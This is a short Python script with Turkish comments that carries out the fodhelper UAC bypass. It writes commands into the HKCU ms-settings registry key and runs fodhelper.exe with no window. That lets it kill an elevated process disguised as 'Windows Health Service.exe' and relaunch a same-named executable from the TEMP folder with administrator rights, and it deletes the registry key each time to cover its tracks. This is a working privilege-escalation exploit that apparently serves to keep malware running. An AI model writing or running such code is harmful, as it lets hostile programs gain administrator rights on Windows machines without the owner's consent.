import os
import winreg
import subprocess
import time
import sys

# --- AYARLAR ---
# Görev yöneticisindeki tam isim (Uzantısı dahil)
target_process_name = "Windows Health Service.exe" 
# ----------------

def force_kill_high_privilege_process():
    """
    Süreci kapatmak için taskkill komutunu UAC bypass ile tetikleriz.
    Çünkü yönetici yetkili bir süreci ancak başka bir yönetici yetkili komut kapatabilir.
    """
    reg_path = r'Software\Classes\ms-settings\shell\open\command'
    # Taskkill komutunu hazırlıyoruz
    kill_command = f'cmd /c taskkill /F /IM "{target_process_name}" /T'
    
    try:
        # 1. Kayıt defterini taskkill komutuyla ayarla
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, kill_command)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        
        # 2. fodhelper ile taskkill'i yönetici olarak çalıştır (Kapatma işlemi)
        subprocess.run("fodhelper.exe", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        time.sleep(2) # Kapanması için bekle
        
        # 3. Kayıt defterini temizle (Yeniden açma işlemi için hazırlık)
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
    except:
        pass

def bypass_uac_and_run_new():
    """Süreci yönetici olarak yeniden başlatır."""
    reg_path = r'Software\Classes\ms-settings\shell\open\command'
    temp_folder = os.environ.get('TEMP')
    full_path = os.path.join(temp_folder, target_process_name)

    if not os.path.exists(full_path):
        return

    try:
        # 1. Kayıt defterini yeni EXE yoluyla ayarla
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{full_path}"')
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        
        # 2. fodhelper ile EXE'yi yönetici olarak başlat
        subprocess.run("fodhelper.exe", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        time.sleep(3)
        
        # 3. Temizlik
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
    except:
        pass

if __name__ == "__main__":
    # ÖNCE: Eski yönetici yetkili süreci UAC bypass kullanarak kapat
    force_kill_high_privilege_process()
    
    # SONRA: Yeni süreci UAC bypass kullanarak başlat
    bypass_uac_and_run_new()
